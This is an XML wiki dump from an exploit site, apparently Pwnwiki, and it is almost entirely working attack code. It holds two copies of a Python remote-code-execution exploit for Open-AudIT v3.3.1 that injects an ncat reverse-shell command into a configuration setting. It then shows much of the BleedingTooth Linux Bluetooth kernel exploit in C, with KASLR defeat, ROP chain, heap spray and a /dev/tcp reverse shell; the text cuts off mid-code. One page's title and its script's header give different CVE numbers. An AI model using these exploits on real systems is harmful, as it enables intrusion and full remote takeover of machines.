      <comment>Created page with "==漏洞影响=="</comment>
      <origin>5191</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4648" sha1="elwq5nn5j21872udgutv4872df1vv0a" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;pre&gt;
Open-AudIT v3.3.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution
# Date: 22/04/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://opmantek.com/
# Version: v3.3.1
# Tested on: Ubuntu 18.04 / PHP 7.2.24

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
   print("[~] Usage : ./openaudit-exploit.py url username password ip port")
   exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

def inject_payload():
   configuration_path = url+"/en/omk/open-audit/configuration/90"
   data = 'data={"data":{"id":"90","type":"configuration","attributes":{"value":";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};"}}}' % (ip, port)
   request.patch(configuration_path, data)
   print("[+] Payload injected in settings")


def start_discovery():
   discovery_path = url+"/en/omk/open-audit/discoveries/create"
   post_discovery_path = url+"/en/omk/open-audit/discoveries"
   scan_name = "".join([random.choice(string.ascii_uppercase) for i in range(10)])
   req = request.get(discovery_path)

   response = req.text
   soup = BeautifulSoup(response, "html5lib")
   token = soup.findAll('input')[5].get("value")
   buttons = soup.findAll("button")
   headers = {"Referer" : discovery_path}
   request_data = {
   "data[attributes][name]":scan_name,
   "data[attributes][other][subnet]":"10.10.10.1/24",
   "data[attributes][other][ad_server]":"",
   "data[attributes][other][ad_domain]":"",
   "submit":"",
   "data[type]":"discoveries",
   "data[access_token]":token,
   "data[attributes][complete]":"y",
   "data[attributes][org_id]":"1",
   "data[attributes][type]":"subnet",
   "data[attributes][devices_assigned_to_org]":"",
   "data[attributes][devices_assigned_to_location]":"",
   "data[attributes][other][nmap][discovery_scan_option_id]":"1",
   "data[attributes][other][nmap][ping]":"y",
   "data[attributes][other][nmap][service_version]":"n",
   "data[attributes][other][nmap][open|filtered]":"n",
   "data[attributes][other][nmap][filtered]":"n",
   "data[attributes][other][nmap][timing]":"4",
   "data[attributes][other][nmap][nmap_tcp_ports]":"0",
   "data[attributes][other][nmap][nmap_udp_ports]":"0",
   "data[attributes][other][nmap][tcp_ports]":"22,135,62078",
   "data[attributes][other][nmap][udp_ports]":"161",
   "data[attributes][other][nmap][timeout]":"",
   "data[attributes][other][nmap][exclude_tcp_ports]":"",
   "data[attributes][other][nmap][exclude_udp_ports]":"",
   "data[attributes][other][nmap][exclude_ip]":"",
   "data[attributes][other][nmap][ssh_ports]":"22",
   "data[attributes][other][match][match_dbus]":"",
   "data[attributes][other][match][match_fqdn]":"",
   "data[attributes][other][match][match_dns_fqdn]":"",
   "data[attributes][other][match][match_dns_hostname]":"",
   "data[attributes][other][match][match_hostname]":"",
   "data[attributes][other][match][match_hostname_dbus]":"",
   "data[attributes][other][match][match_hostname_serial]":"",
   "data[attributes][other][match][match_hostname_uuid]":"",
   "data[attributes][other][match][match_ip]":"",
   "data[attributes][other][match][match_ip_no_data]":"",
   "data[attributes][other][match][match_mac]":"",
   "data[attributes][other][match][match_mac_vmware]":"",
   "data[attributes][other][match][match_serial]":"",
   "data[attributes][other][match][match_serial_type]":"",
   "data[attributes][other][match][match_sysname]":"",
   "data[attributes][other][match][match_sysname_serial]":"",
   "data[attributes][other][match][match_uuid]":""

   }
   print("[+] Creating discovery ..")
   req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False)
   disocvery_url = url + req.headers['Location'] + "/execute"
   print("[+] Triggering payload ..")
   print("[+] Check your nc ;)")
   request.get(disocvery_url)


def login():
   login_info = {
   "redirect_url": "/en/omk/open-audit",
   "username": username,
   "password": password
   }
   login_request = request.post(url+"/en/omk/open-audit/login", login_info)
   login_text = login_request.text
   if "There was an error authenticating" in login_text:
       return False
   else:
       return True

if login():
   print("[+] LoggedIn Successfully")
   inject_payload()
   start_discovery()
else:
   print("[-] Cannot login!")
&lt;/pre&gt;</text>
      <sha1>elwq5nn5j21872udgutv4872df1vv0a</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-12078 Open-AudIT v3.3.1 遠程命令執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6110</id>
    <revision>
      <id>6980</id>
      <timestamp>2021-07-10T09:50:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>6980</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4648" sha1="mphtlgm2qc7oc7hwjtkomc2nt94bfs9" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
&lt;pre&gt;
Open-AudIT v3.3.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution
# Date: 22/04/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://opmantek.com/
# Version: v3.3.1
# Tested on: Ubuntu 18.04 / PHP 7.2.24

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
   print("[~] Usage : ./openaudit-exploit.py url username password ip port")
   exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

def inject_payload():
   configuration_path = url+"/en/omk/open-audit/configuration/90"
   data = 'data={"data":{"id":"90","type":"configuration","attributes":{"value":";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};"}}}' % (ip, port)
   request.patch(configuration_path, data)
   print("[+] Payload injected in settings")


def start_discovery():
   discovery_path = url+"/en/omk/open-audit/discoveries/create"
   post_discovery_path = url+"/en/omk/open-audit/discoveries"
   scan_name = "".join([random.choice(string.ascii_uppercase) for i in range(10)])
   req = request.get(discovery_path)

   response = req.text
   soup = BeautifulSoup(response, "html5lib")
   token = soup.findAll('input')[5].get("value")
   buttons = soup.findAll("button")
   headers = {"Referer" : discovery_path}
   request_data = {
   "data[attributes][name]":scan_name,
   "data[attributes][other][subnet]":"10.10.10.1/24",
   "data[attributes][other][ad_server]":"",
   "data[attributes][other][ad_domain]":"",
   "submit":"",
   "data[type]":"discoveries",
   "data[access_token]":token,
   "data[attributes][complete]":"y",
   "data[attributes][org_id]":"1",
   "data[attributes][type]":"subnet",
   "data[attributes][devices_assigned_to_org]":"",
   "data[attributes][devices_assigned_to_location]":"",
   "data[attributes][other][nmap][discovery_scan_option_id]":"1",
   "data[attributes][other][nmap][ping]":"y",
   "data[attributes][other][nmap][service_version]":"n",
   "data[attributes][other][nmap][open|filtered]":"n",
   "data[attributes][other][nmap][filtered]":"n",
   "data[attributes][other][nmap][timing]":"4",
   "data[attributes][other][nmap][nmap_tcp_ports]":"0",
   "data[attributes][other][nmap][nmap_udp_ports]":"0",
   "data[attributes][other][nmap][tcp_ports]":"22,135,62078",
   "data[attributes][other][nmap][udp_ports]":"161",
   "data[attributes][other][nmap][timeout]":"",
   "data[attributes][other][nmap][exclude_tcp_ports]":"",
   "data[attributes][other][nmap][exclude_udp_ports]":"",
   "data[attributes][other][nmap][exclude_ip]":"",
   "data[attributes][other][nmap][ssh_ports]":"22",
   "data[attributes][other][match][match_dbus]":"",
   "data[attributes][other][match][match_fqdn]":"",
   "data[attributes][other][match][match_dns_fqdn]":"",
   "data[attributes][other][match][match_dns_hostname]":"",
   "data[attributes][other][match][match_hostname]":"",
   "data[attributes][other][match][match_hostname_dbus]":"",
   "data[attributes][other][match][match_hostname_serial]":"",
   "data[attributes][other][match][match_hostname_uuid]":"",
   "data[attributes][other][match][match_ip]":"",
   "data[attributes][other][match][match_ip_no_data]":"",
   "data[attributes][other][match][match_mac]":"",
   "data[attributes][other][match][match_mac_vmware]":"",
   "data[attributes][other][match][match_serial]":"",
   "data[attributes][other][match][match_serial_type]":"",
   "data[attributes][other][match][match_sysname]":"",
   "data[attributes][other][match][match_sysname_serial]":"",
   "data[attributes][other][match][match_uuid]":""

   }
   print("[+] Creating discovery ..")
   req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False)
   disocvery_url = url + req.headers['Location'] + "/execute"
   print("[+] Triggering payload ..")
   print("[+] Check your nc ;)")
   request.get(disocvery_url)


def login():
   login_info = {
   "redirect_url": "/en/omk/open-audit",
   "username": username,
   "password": password
   }
   login_request = request.post(url+"/en/omk/open-audit/login", login_info)
   login_text = login_request.text
   if "There was an error authenticating" in login_text:
       return False
   else:
       return True

if login():
   print("[+] LoggedIn Successfully")
   inject_payload()
   start_discovery()
else:
   print("[-] Cannot login!")
&lt;/pre&gt;</text>
      <sha1>mphtlgm2qc7oc7hwjtkomc2nt94bfs9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-12352&amp;CVE-2020-12351 Linux Kernel 5.4 BleedingTooth遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1012</id>
    <revision>
      <id>1286</id>
      <timestamp>2021-04-09T00:50:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Linux Kernel 5.4 - 'BleedingTooth' Bluetooth Zero-Click Remote Code Execution # Date: 06/04/2020 # Exploit Author: Google Security Research (And..."</comment>
      <origin>1286</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="19859" sha1="3yvnwc32latjp2ll8b45jo3yydpgb9t" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Linux Kernel 5.4 - 'BleedingTooth' Bluetooth Zero-Click Remote Code Execution
# Date: 06/04/2020
# Exploit Author: Google Security Research (Andy Nguyen)
# Tested on: 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
# CVE : CVE-2020-12351, CVE-2020-12352

/*
 * BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution
 * by Andy Nguyen (theflow@)
 *
 * This Proof-Of-Concept demonstrates the exploitation of
 * CVE-2020-12351 and CVE-2020-12352.
 *
 * Compile using:
 *   $ gcc -o exploit exploit.c -lbluetooth
 *
 * and execute as:
 *   $ sudo ./exploit target_mac source_ip source_port
 *
 * In another terminal, run:
 *   $ nc -lvp 1337
 *   exec bash -i 2&gt;&amp;0 1&gt;&amp;0
 *
 * If successful, a calc can be spawned with:
 *   export XAUTHORITY=/run/user/1000/gdm/Xauthority
 *   export DISPLAY=:0
 *   gnome-calculator
 *
 * This Proof-Of-Concept has been tested against a Dell XPS 15 running
 * Ubuntu 20.04.1 LTS with:
 * - 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020
 *   x86_64 x86_64 x86_64 GNU/Linux
 *
 * The success rate of the exploit is estimated at 80%.
 */

#include &lt;bluetooth/bluetooth.h&gt;
#include &lt;bluetooth/hci.h&gt;
#include &lt;bluetooth/hci_lib.h&gt;
#include &lt;bluetooth/l2cap.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/uio.h&gt;
#include &lt;unistd.h&gt;

#define REMOTE_COMMAND "/bin/bash -c /bin/bash&lt;/dev/tcp/%s/%s"

// Increase if the heap spray is not reliable.
#define NUM_SPRAY_KMALLOC_1024 6
#define NUM_SPRAY_KMALLOC_128 6

// Increase if stuck at sending packets.
#define HCI_SEND_ACL_DATA_WAIT_USEC 5000

#define KERNEL_TEXT_BASE 0xffffffff81000000

#define KERNEL_UBUNTU_5_4_0_48 1

#ifdef KERNEL_UBUNTU_5_4_0_48
#define PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET 0xffffffff81567f46
#define POP_RAX_RET 0xffffffff8103d0b1
#define POP_RDI_RET 0xffffffff8108efa0
#define JMP_RAX 0xffffffff8100005b
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260

#define KASLR_DEFEAT(kaslr_offset, kernel_addr)                                \
  do {                                                                         \
    if ((kernel_addr &amp; 0xfffff) == 0xf4d8e)                                    \
      kaslr_offset = kernel_addr - KERNEL_TEXT_BASE - 0xf4d8e;                 \
    else                                                                       \
      kaslr_offset = kernel_addr - KERNEL_TEXT_BASE - 0xc001a4;                \
  } while (0)
#else
#error "No kernel version defined"
#endif

#define L2CAP_IDENT 0x41

#define SIGNALLING_CID 0x01
#define AMP_MGR_CID 0x03

typedef struct {
  uint8_t code;
  uint8_t ident;
  uint16_t len;
} __attribute__((packed)) a2mp_hdr;
#define A2MP_HDR_SIZE 4

#define A2MP_COMMAND_REJ 0x01
typedef struct {
  uint16_t reason;
} __attribute__((packed)) a2mp_command_rej;

#define A2MP_INFO_REQ 0x06
typedef struct {
  uint8_t id;
} __attribute__((packed)) a2mp_info_req;

#define A2MP_INFO_RSP 0x07
typedef struct {
  uint8_t id;
  uint8_t status;
  uint32_t total_bw;
  uint32_t max_bw;
  uint32_t min_latency;
  uint16_t pal_caps;
  uint16_t assoc_size;
} __attribute__((packed)) a2mp_info_rsp;

#define A2MP_ASSOC_REQ 0x08
typedef struct {
  uint8_t id;
} __attribute__((packed)) a2mp_assoc_req;

#define A2MP_ASSOC_RSP 0x09
typedef struct {
  uint8_t id;
  uint8_t status;
  uint8_t assoc_data[0];
} __attribute__((packed)) a2mp_assoc_rsp;

typedef struct {
  uint8_t mode;
  uint8_t txwin_size;
  uint8_t max_transmit;
  uint16_t retrans_timeout;
  uint16_t monitor_timeout;
  uint16_t max_pdu_size;
} __attribute__((packed)) l2cap_conf_rfc;

static char remote_command[64];

static int hci_sock = 0, l2_sock = 0;
static uint16_t hci_handle = 0;

static uint64_t kaslr_offset = 0, l2cap_chan_addr = 0;

static uint16_t crc16_tab[] = {
    0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241, 0xC601,
    0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440, 0xCC01, 0x0CC0,
    0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40, 0x0A00, 0xCAC1, 0xCB81,
    0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841, 0xD801, 0x18C0, 0x1980, 0xD941,
    0x1B00, 0xDBC1, 0xDA81, 0x1A40, 0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01,
    0x1DC0, 0x1C80, 0xDC41, 0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0,
    0x1680, 0xD641, 0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081,
    0x1040, 0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
    0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441, 0x3C00,
    0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41, 0xFA01, 0x3AC0,
    0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840, 0x2800, 0xE8C1, 0xE981,
    0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41, 0xEE01, 0x2EC0, 0x2F80, 0xEF41,
    0x2D00, 0xEDC1, 0xEC81, 0x2C40, 0xE401, 0x24C0, 0x2580, 0xE541, 0x2700,
    0xE7C1, 0xE681, 0x2640, 0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0,
    0x2080, 0xE041, 0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281,
    0x6240, 0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
    0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41, 0xAA01,
    0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840, 0x7800, 0xB8C1,
    0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41, 0xBE01, 0x7EC0, 0x7F80,
    0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40, 0xB401, 0x74C0, 0x7580, 0xB541,
    0x7700, 0xB7C1, 0xB681, 0x7640, 0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101,
    0x71C0, 0x7080, 0xB041, 0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0,
    0x5280, 0x9241, 0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481,
    0x5440, 0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
    0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841, 0x8801,
    0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40, 0x4E00, 0x8EC1,
    0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41, 0x4400, 0x84C1, 0x8581,
    0x4540, 0x8701, 0x47C0, 0x4680, 0x8641, 0x8201, 0x42C0, 0x4380, 0x8341,
    0x4100, 0x81C1, 0x8081, 0x4040,
};

static uint16_t crc16(uint16_t crc, const void *buf, size_t size) {
  const uint8_t *p = buf;
  while (size--)
    crc = crc16_tab[(crc ^ (*p++)) &amp; 0xff] ^ (crc &gt;&gt; 8);
  return crc;
}

static int connect_l2cap(bdaddr_t dst_addr, uint16_t *handle) {
  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) &lt; 0) {
    perror("[-] socket");
    exit(1);
  }

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  memcpy(&amp;laddr.l2_bdaddr, BDADDR_ANY, sizeof(bdaddr_t));
  if (bind(l2_sock, (struct sockaddr *)&amp;laddr, sizeof(laddr)) &lt; 0) {
    perror("[-] bind");
    exit(1);
  }

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;
  if (connect(l2_sock, (struct sockaddr *)&amp;raddr, sizeof(raddr)) &lt; 0 &amp;&amp;
      errno != EALREADY) {
    perror("[-] connect");
    exit(1);
  }

  struct l2cap_conninfo conninfo = {0};
  socklen_t len = sizeof(conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &amp;conninfo, &amp;len) &lt; 0) {
    perror("[-] getsockopt");
    exit(1);
  }

  if (handle)
    *handle = conninfo.hci_handle;

  return l2_sock;
}

static int connect_hci(void) {
  struct hci_dev_info di = {0};
  int hci_device_id = hci_get_route(NULL);
  int hci_sock = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &amp;di) &lt; 0) {
    perror("[-] hci_devinfo");
    exit(1);
  }

  struct hci_filter flt = {0};
  hci_filter_clear(&amp;flt);
  hci_filter_all_ptypes(&amp;flt);
  hci_filter_all_events(&amp;flt);
  if (setsockopt(hci_sock, SOL_HCI, HCI_FILTER, &amp;flt, sizeof(flt)) &lt; 0) {
    perror("[-] setsockopt(HCI_FILTER)");
    exit(1);
  }

  return hci_sock;
}

static void wait_event_complete_packet(void) {
  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_sock, buf, sizeof(buf)) &lt; 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_EVENT_PKT) {
      hci_event_hdr *hdr = (hci_event_hdr *)&amp;buf[1];
      if (btohs(hdr-&gt;evt) == EVT_NUM_COMP_PKTS)
        break;
    }
  }
}

static void hci_send_acl_data(int hci_sock, uint16_t hci_handle, void *data,
                              uint16_t data_length, uint16_t flags) {
  uint8_t type = HCI_ACLDATA_PKT;

  hci_acl_hdr hdr = {0};
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3] = {0};
  iv[0].iov_base = &amp;type;
  iv[0].iov_len = sizeof(type);
  iv[1].iov_base = &amp;hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;
  if (writev(hci_sock, iv, sizeof(iv) / sizeof(struct iovec)) &lt; 0) {
    perror("[-] writev");
    exit(1);
  }

  usleep(HCI_SEND_ACL_DATA_WAIT_USEC);
  wait_event_complete_packet();
}

static void disconnect_a2mp(void) {
  printf("[*] Disconnecting A2MP channel...\n");

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_disconn_req disconn_req;
  } disconn_req = {0};
  disconn_req.hdr.len = htobs(sizeof(disconn_req) - L2CAP_HDR_SIZE);
  disconn_req.hdr.cid = htobs(SIGNALLING_CID);
  disconn_req.cmd_hdr.code = L2CAP_DISCONN_REQ;
  disconn_req.cmd_hdr.ident = L2CAP_IDENT;
  disconn_req.cmd_hdr.len =
      htobs(sizeof(disconn_req) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  disconn_req.disconn_req.dcid = htobs(AMP_MGR_CID);
  disconn_req.disconn_req.scid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_sock, hci_handle, &amp;disconn_req, sizeof(disconn_req), 2);
}

static void connect_a2mp(void) {
  printf("[*] Connecting A2MP channel...\n");

  struct {
    l2cap_hdr hdr;
  } a2mp_create = {0};
  a2mp_create.hdr.len = htobs(sizeof(a2mp_create) - L2CAP_HDR_SIZE);
  a2mp_create.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_sock, hci_handle, &amp;a2mp_create, sizeof(a2mp_create), 2);

  // Configure to L2CAP_MODE_BASIC and max MTU.
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
    l2cap_conf_opt conf_opt2;
    uint16_t conf_mtu;
  } conf_rsp = {0};
  conf_rsp.hdr.len = htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE);
  conf_rsp.hdr.cid = htobs(SIGNALLING_CID);
  conf_rsp.cmd_hdr.code = L2CAP_CONF_RSP;
  conf_rsp.cmd_hdr.ident = L2CAP_IDENT;
  conf_rsp.cmd_hdr.len =
      htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  conf_rsp.conf_rsp.scid = htobs(AMP_MGR_CID);
  conf_rsp.conf_rsp.flags = htobs(0);
  conf_rsp.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  conf_rsp.conf_opt.type = L2CAP_CONF_RFC;
  conf_rsp.conf_opt.len = sizeof(l2cap_conf_rfc);
  conf_rsp.conf_rfc.mode = L2CAP_MODE_BASIC;
  conf_rsp.conf_opt2.type = L2CAP_CONF_MTU;
  conf_rsp.conf_opt2.len = sizeof(uint16_t);
  conf_rsp.conf_mtu = htobs(0xffff);
  hci_send_acl_data(hci_sock, hci_handle, &amp;conf_rsp, sizeof(conf_rsp), 2);
}

static void prepare_l2cap_chan_addr_leak(void) {
  printf("[*] Preparing to leak l2cap_chan address...\n");

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } conf_rsp = {0};
  conf_rsp.hdr.len = htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE);
  conf_rsp.hdr.cid = htobs(SIGNALLING_CID);
  conf_rsp.cmd_hdr.code = L2CAP_CONF_RSP;
  conf_rsp.cmd_hdr.ident = L2CAP_IDENT;
  conf_rsp.cmd_hdr.len =
      htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  conf_rsp.conf_rsp.scid = htobs(AMP_MGR_CID);
  conf_rsp.conf_rsp.flags = htobs(0);
  conf_rsp.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  conf_rsp.conf_opt.type = L2CAP_CONF_RFC;
  conf_rsp.conf_opt.len = sizeof(l2cap_conf_rfc);
  conf_rsp.conf_rfc.mode = L2CAP_MODE_ERTM;
  hci_send_acl_data(hci_sock, hci_handle, &amp;conf_rsp, sizeof(conf_rsp), 2);
}

static uint64_t leak_kstack(void) {
  printf("[*] Leaking A2MP kernel stack memory...\n");

  struct {
    l2cap_hdr hdr;
    a2mp_hdr amp_hdr;
    a2mp_info_req info_req;
  } info_req = {0};
  info_req.hdr.len = htobs(sizeof(info_req) - L2CAP_HDR_SIZE);
  info_req.hdr.cid = htobs(AMP_MGR_CID);
  info_req.amp_hdr.code = A2MP_INFO_REQ;
  info_req.amp_hdr.ident = L2CAP_IDENT;
  info_req.amp_hdr.len =
      htobs(sizeof(info_req) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
  // Use a dummy id to make hci_dev_get() fail.
  info_req.info_req.id = 0x42;
  hci_send_acl_data(hci_sock, hci_handle, &amp;info_req, sizeof(info_req), 2);

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_sock, buf, sizeof(buf)) &lt; 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_hdr *l2_hdr = (l2cap_hdr *)&amp;buf[5];
      if (btohs(l2_hdr-&gt;cid) == AMP_MGR_CID) {
        a2mp_hdr *amp_hdr = (a2mp_hdr *)&amp;buf[9];
        if (amp_hdr-&gt;code == A2MP_INFO_RSP)
          return *(uint64_t *)&amp;buf[21];
      }
    }
  }

  return 0;
}

static void trigger_type_confusion(void) {
  struct {
    l2cap_hdr hdr;
    uint16_t ctrl;
    a2mp_hdr amp_hdr;
    a2mp_command_rej cmd_rej;
    uint16_t fcs;
  } cmd_rej = {0};
  cmd_rej.hdr.len = htobs(sizeof(cmd_rej) - L2CAP_HDR_SIZE);
  cmd_rej.hdr.cid = htobs(AMP_MGR_CID);
  cmd_rej.ctrl = 0xffff;
  cmd_rej.amp_hdr.code = A2MP_COMMAND_REJ;
  cmd_rej.amp_hdr.ident = L2CAP_IDENT;
  cmd_rej.amp_hdr.len = htobs(sizeof(cmd_rej) - L2CAP_HDR_SIZE -
                              sizeof(a2mp_hdr) - sizeof(uint32_t));
  cmd_rej.cmd_rej.reason = 0;
  cmd_rej.fcs = crc16(0, &amp;cmd_rej, sizeof(cmd_rej) - sizeof(uint16_t));
  hci_send_acl_data(hci_sock, hci_handle, &amp;cmd_rej, sizeof(cmd_rej), 2);
}

static void build_krop(uint64_t *rop, uint64_t cmd_addr) {
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + RUN_CMD;
  *rop++ = kaslr_offset + POP_RDI_RET;
  *rop++ = cmd_addr;
  *rop++ = kaslr_offset + JMP_RAX;
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + DO_TASK_DEAD;
  *rop++ = kaslr_offset + JMP_RAX;
}

static void build_payload(uint8_t data[0x400]) {
  // Fake sk_filter object starting at offset 0x300.
  *(uint64_t *)&amp;data[0x318] = l2cap_chan_addr + 0x320; // prog

  // Fake bpf_prog object starting at offset 0x320.
  // RBX points to the amp_mgr object.
  *(uint64_t *)&amp;data[0x350] =
      kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET; // bpf_func
  *(uint64_t *)&amp;data[0x358] = 0xDEADBEEF;                  // rbp

  // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
  // Note that when executing the ROP chain, the data below in memory will be
  // overwritten. Therefore, the argument should be located after the ROP chain.
  build_krop((uint64_t *)&amp;data[0x360], l2cap_chan_addr + 0x3c0);
  strncpy(&amp;data[0x3c0], remote_command, 0x40);
}

static void spray_kmalloc_1024(int num) {
  // Skip first two hci devices because they may be legit.
  for (int i = 2; i &lt; num + 2; i++) {
    printf("\r[*] Sending packet with id #%d...", i);
    fflush(stdout);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_info_rsp info_rsp;
    } info_rsp = {0};
    info_rsp.hdr.len = htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE);
    info_rsp.hdr.cid = htobs(AMP_MGR_CID);
    info_rsp.amp_hdr.code = A2MP_INFO_RSP;
    info_rsp.amp_hdr.ident = L2CAP_IDENT;
    info_rsp.amp_hdr.len =
        htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    info_rsp.info_rsp.id = i;
    hci_send_acl_data(hci_sock, hci_handle, &amp;info_rsp, sizeof(info_rsp), 2);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_assoc_rsp assoc_rsp;
      uint8_t data[0x400];
    } assoc_rsp = {0};
    assoc_rsp.hdr.len = htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE);
    assoc_rsp.hdr.cid = htobs(AMP_MGR_CID);
    assoc_rsp.amp_hdr.code = A2MP_ASSOC_RSP;
    assoc_rsp.amp_hdr.ident = L2CAP_IDENT;
    assoc_rsp.amp_hdr.len =
